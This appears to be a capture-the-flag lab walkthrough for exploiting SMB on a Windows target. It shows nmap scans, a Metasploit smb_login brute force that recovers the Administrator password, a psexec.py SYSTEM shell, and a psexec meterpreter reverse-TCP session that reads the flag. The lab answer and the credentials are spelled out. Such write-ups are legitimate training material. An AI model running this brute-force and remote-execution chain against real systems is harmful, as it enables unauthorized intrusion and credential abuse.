### Exploit SMB with PxExec

- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and so on) between computers on a LAN (local network).
- SMB uses port 445(TCP). However originally SMB ran on top of NetBIOS using port 139.
- SAMBA is the open source linux implementation of SMB, and allows windows systems to access the linux shares and devices.
- SMB protocol utilizes two levels of authentication
	- User authentication
	- Share authentication
- User authentication - users must provide a username and password in order to authenticate with the SMB server in order to access a share
- Share authentication - users must provide a password in order to access restricted share.

Note: Both of these authetication levels utilize a challenge response authetication system.

**Exploitation:**

- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.
- This can be done by leveragin various tools and techniques, however, the most common technique will involve performing SMB login brute-force attack
- We can narrow down our brute force attack to only include common windows user 
	- Administrator
- After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target systems via PsExec and execute arbitrary system commands or obtain a reverse shell.

---

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.

**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!

Instructions:

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1
- Dictionaries to use:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Target: 10.5.21.2

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.21.2
PING 10.5.21.2 (10.5.21.2) 56(84) bytes of data.
64 bytes from 10.5.21.2: icmp_seq=1 ttl=125 time=3.16 ms
64 bytes from 10.5.21.2: icmp_seq=2 ttl=125 time=2.27 ms
64 bytes from 10.5.21.2: icmp_seq=3 ttl=125 time=2.30 ms
64 bytes from 10.5.21.2: icmp_seq=4 ttl=125 time=2.28 ms
64 bytes from 10.5.21.2: icmp_seq=5 ttl=125 time=2.47 ms

--- 10.5.21.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 2.273/2.497/3.162/0.340 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 10.5.21.2
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-17 12:57 IST
Nmap scan report for 10.5.21.2
Host is up (0.0022s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.57 seconds
```

```
root@attackdefense:~# nmap -sV -sC 10.5.21.2
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-17 12:57 IST
Nmap scan report for 10.5.21.2
Host is up (0.0022s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EC2AMAZ-408S766
| Not valid before: 2023-07-16T07:24:27
|_Not valid after:  2024-01-15T07:24:27
|_ssl-date: 2023-07-17T07:28:12+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-17 12:58:15
|_  start_date: 2023-07-17 12:54:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.19 seconds
```

[[msfconsole]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2052 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter session on many platforms using sessions -u <session_id>

msf5 > search smb

Matching Modules
================

   #    Name                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                            ---------------  ----       -----  -----------
   0    auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   1    auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   2    auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
   3    auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
   4    auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     No     Oracle SMB Relay Code Execution
   5    auxiliary/admin/smb/check_dir_file                                               normal     No     SMB Scanner Check File/Directory Utility
   6    auxiliary/admin/smb/delete_file                                                  normal     No     SMB File Delete Utility
   7    auxiliary/admin/smb/download_file                                                normal     No     SMB File Download Utility
   8    auxiliary/admin/smb/list_directory                                               normal     No     SMB Directory Listing Utility
   9    auxiliary/admin/smb/ms17_010_command                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   10   auxiliary/admin/smb/psexec_command                                               normal     No     Microsoft Windows Authenticated Administration Utility
   11   auxiliary/admin/smb/psexec_ntdsgrab                                              normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   12   auxiliary/admin/smb/samba_symlink_traversal                                      normal     No     Samba Symlink Directory Traversal
   13   auxiliary/admin/smb/upload_file                                                  normal     No     SMB File Upload Utility
   14   auxiliary/admin/smb/webexec_command                                              normal     No     WebEx Remote Command Execution Utility
   15   auxiliary/docx/word_unc_injector                                                 normal     No     Microsoft Word UNC Path Injector
   16   auxiliary/dos/samba/read_nttrans_ea_list                                         normal     No     Samba read_nttrans_ea_list Integer Overflow
   17   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
   18   auxiliary/dos/smb/smb_loris                                     2017-06-29       normal     No     SMBLoris NBSS Denial of Service
   19   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
   20   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
   21   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
   22   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   23   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   24   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   25   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   26   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   27   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
   28   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
   29   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   30   auxiliary/fileformat/multidrop                                                   normal     No     Windows SMB Multi Dropper
   31   auxiliary/fileformat/odt_badodt                                 2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
   32   auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal     No     SMB Negotiate SMB2 Dialect Corruption
   33   auxiliary/fuzzers/smb/smb_create_pipe                                            normal     No     SMB Create Pipe Request Fuzzer
   34   auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal     No     SMB Create Pipe Request Corruption
   35   auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal     No     SMB Negotiate Dialect Corruption
   36   auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal     No     SMB NTLMv1 Login Request Corruption
   37   auxiliary/fuzzers/smb/smb_tree_connect                                           normal     No     SMB Tree Connect Request Fuzzer
   38   auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal     No     SMB Tree Connect Request Corruption
   39   auxiliary/gather/konica_minolta_pwd_extract                                      normal     No     Konica Minolta Password Extractor
   40   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
   41   auxiliary/scanner/sap/sap_smb_relay                                              normal     No     SAP SMB Relay Abuse
   42   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   43   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   44   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   45   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal     No     DCOM Exec
   46   auxiliary/scanner/smb/impacket/secretsdump                                       normal     No     DCOM Exec
   47   auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal     No     WMI Exec
   48   auxiliary/scanner/smb/pipe_auditor                                               normal     No     SMB Session Pipe Auditor
   49   auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal     No     SMB Session Pipe DCERPC Auditor
   50   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   51   auxiliary/scanner/smb/smb1                                                       normal     No     SMBv1 Protocol Detection
   52   auxiliary/scanner/smb/smb2                                                       normal     No     SMB 2.0 Protocol Detection
   53   auxiliary/scanner/smb/smb_enum_gpp                                               normal     No     SMB Group Policy Preference Saved Passwords Enumeration
   54   auxiliary/scanner/smb/smb_enumshares                                             normal     No     SMB Share Enumeration
   55   auxiliary/scanner/smb/smb_enumusers                                              normal     No     SMB User Enumeration (SAM EnumUsers)
   56   auxiliary/scanner/smb/smb_enumusers_domain                                       normal     No     SMB Domain User Enumeration
   57   auxiliary/scanner/smb/smb_login                                                  normal     No     SMB Login Check Scanner
   58   auxiliary/scanner/smb/smb_lookupsid                                              normal     No     SMB SID User Enumeration (LookupSid)
   59   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
   60   auxiliary/scanner/smb/smb_uninit_cred                                            normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   61   auxiliary/scanner/smb/smb_version                                                normal     No     SMB Version Detection
   62   auxiliary/scanner/snmp/snmp_enumshares                                           normal     No     SNMP Windows SMB Share Enumeration
   63   auxiliary/server/capture/smb                                                     normal     No     Authentication Capture: SMB
   64   auxiliary/server/http_ntlmrelay                                                  normal     No     HTTP Client MS Credential Relayer
   65   auxiliary/spoof/nbns/nbns_response                                               normal     No     NetBIOS Name Service Spoofer
   66   exploit/linux/samba/chain_reply                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   67   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   68   exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   69   exploit/netware/smb/lsass_cifs                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
   70   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   71   exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   72   exploit/windows/browser/java_ws_double_quote                    2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   73   exploit/windows/browser/java_ws_vmargs                          2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   74   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   75   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   76   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   77   exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   78   exploit/windows/fileformat/vlc_smb_uri                          2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
   79   exploit/windows/http/generic_http_dll_injection                 2015-03-04       manual     No     Generic Web Application DLL Injection
   80   exploit/windows/local/cve_2020_0796_smbghost                    2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
   81   exploit/windows/misc/hp_dataprotector_cmd_exec                  2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
   82   exploit/windows/misc/hp_dataprotector_install_service           2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
   83   exploit/windows/oracle/extjob                                   2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
   84   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   85   exploit/windows/smb/generic_smb_dll_injection                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   86   exploit/windows/smb/group_policy_startup                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   87   exploit/windows/smb/ipass_pipe_exec                             2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   88   exploit/windows/smb/ms03_049_netapi                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   89   exploit/windows/smb/ms04_007_killbill                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   90   exploit/windows/smb/ms04_011_lsass                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   91   exploit/windows/smb/ms04_031_netdde                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
   92   exploit/windows/smb/ms05_039_pnp                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   93   exploit/windows/smb/ms06_025_rasmans_reg                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   94   exploit/windows/smb/ms06_025_rras                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   95   exploit/windows/smb/ms06_040_netapi                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   96   exploit/windows/smb/ms06_066_nwapi                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   97   exploit/windows/smb/ms06_066_nwwks                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   98   exploit/windows/smb/ms06_070_wkssvc                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   99   exploit/windows/smb/ms07_029_msdns_zonename                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
   100  exploit/windows/smb/ms08_067_netapi                             2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   101  exploit/windows/smb/ms09_050_smb2_negotiate_func_index          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   102  exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   103  exploit/windows/smb/ms10_061_spoolss                            2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   104  exploit/windows/smb/ms15_020_shortcut_icon_dllloader            2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   105  exploit/windows/smb/ms17_010_eternalblue                        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   106  exploit/windows/smb/ms17_010_eternalblue_win8                   2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   107  exploit/windows/smb/ms17_010_psexec                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   108  exploit/windows/smb/netidentity_xtierrpcpipe                    2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   109  exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   110  exploit/windows/smb/psexec_psh                                  1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   111  exploit/windows/smb/smb_delivery                                2016-07-26       excellent  No     SMB Delivery
   112  exploit/windows/smb/smb_doublepulsar_rce                        2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   113  exploit/windows/smb/smb_relay                                   2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   114  exploit/windows/smb/timbuktu_plughntcommand_bof                 2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   115  exploit/windows/smb/webexec                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
   116  payload/windows/meterpreter/reverse_named_pipe                                   normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
   117  payload/windows/x64/meterpreter/reverse_named_pipe                               normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   118  post/linux/busybox/smb_share_root                                                normal     No     BusyBox SMB Sharing
   119  post/linux/gather/mount_cifs_creds                                               normal     No     Linux Gather Saved mount.cifs/mount.smbfs Credentials
   120  post/windows/escalate/droplnk                                                    normal     No     Windows Escalate SMB Icon LNK Dropper
   121  post/windows/gather/credentials/gpp                                              normal     No     Windows Gather Group Policy Preference Saved Passwords
   122  post/windows/gather/enum_shares                                                  normal     No     Windows Gather SMB Share Enumeration via Registry
   123  post/windows/gather/netlm_downgrade                                              normal     No     Windows NetLM Downgrade Attack
   124  post/windows/gather/word_unc_injector                                            normal     No     Windows Gather Microsoft Office Word UNC Path Injector


Interact with a module by name or index, for example use 124 or use post/windows/gather/word_unc_injector

msf5 > use auxiliary/scanner/smb/smb_login 
msf5 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.5.21.2
rhosts => 10.5.21.2
msf5 auxiliary(scanner/smb/smb_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set verbose false 
verbose => false
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.5.21.2:445         - 10.5.21.2:445 - Success: '.\sysadmin:samantha'
[+] 10.5.21.2:445         - 10.5.21.2:445 - Success: '.\demo:victoria'
[+] 10.5.21.2:445         - 10.5.21.2:445 - Success: '.\auditor:elizabeth'
[+] 10.5.21.2:445         - 10.5.21.2:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.5.21.2:445         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > 
```

[[PsExec]]

```
root@attackdefense:~# psexec.py Administrator:qwertyuiop@10.5.21.2
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.5.21.2.....
[*] Found writable share admin
[*] Uploading file OEneFIQH.exe
[*] Opening SVCManager on 10.5.21.2.....
[*] Creating service flEl on 10.5.21.2.....
[*] Starting service flEl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>sysinfo
b"'sysinfo' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd /

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 3E75-72A0

 Directory of C:\

07/17/2023  07:44 AM    <DIR>          admin
09/25/2020  06:41 AM                32 flag.txt
02/23/2018  11:06 AM    <DIR>          PerfLogs
12/13/2017  09:00 PM    <DIR>          Program Files
09/25/2020  06:43 AM    <DIR>          Program Files (x86)
09/25/2020  06:42 AM    <DIR>          public
09/25/2020  06:15 AM    <DIR>          Users
09/25/2020  06:14 AM    <DIR>          Windows
               1 File(s)             32 bytes
               7 Dir(s)  17,214,156,800 bytes free

C:\>type flag.txt
e0da81a9cd42b261bc9b90d15f780433
C:\>
```

```
msf5 auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set rhosts 10.5.21.
rhosts => 10.5.21.
msf5 exploit(windows/smb/psexec) > set rhosts 10.5.21.2
rhosts => 10.5.21.2
msf5 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf5 exploit(windows/smb/psexec) > set smbpass qwertyuiop
smbpass => qwertyuiop
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] 10.5.21.2:445 - Connecting to the server...
[*] 10.5.21.2:445 - Authenticating to 10.5.21.2:445 as user 'Administrator'...
[*] 10.5.21.2:445 - Selecting PowerShell target
[*] 10.5.21.2:445 - Executing the payload...
[+] 10.5.21.2:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.5.21.2
[*] Meterpreter session 1 opened (10.10.12.3:4444 -> 10.5.21.2:49806) at 2023-07-17 13:21:38 +0530

meterpreter > shell
Process 3036 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /
cd /

C:\>type flag.txt
type flag.txt
e0da81a9cd42b261bc9b90d15f780433
C:\>
```

